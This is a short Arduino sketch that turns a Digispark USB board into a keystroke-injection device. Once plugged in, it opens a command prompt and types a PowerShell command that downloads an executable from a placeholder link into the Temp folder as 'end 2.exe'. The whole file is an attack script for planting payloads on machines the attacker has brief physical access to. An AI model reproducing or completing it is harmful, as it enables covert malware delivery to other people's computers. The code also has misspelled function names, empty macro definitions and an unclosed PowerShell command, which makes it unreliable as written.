#include "DigiKeyboard.h"
#define MOD_SHIFT_LEFT    
#define MOD_ALT_LEFT  
void setup() {
  // put your setup code here, to run once:
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStoke(0, MOD_GUI_LEFT); 
DigiKeyboard.delay(1000);
DigiKeyboard.print(F("cmd"));
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print(F("powershell (new-object System.Net.WebClient).DownloadFile('link on file, that you want to be downloaded','%Temp%/end 2.exe"));
DigiKeyboard.sendKeySroke(KEY_ENTER);
DigiKeyboard.delay(2000);
DigiKeyboard.print(F("exit"));
}


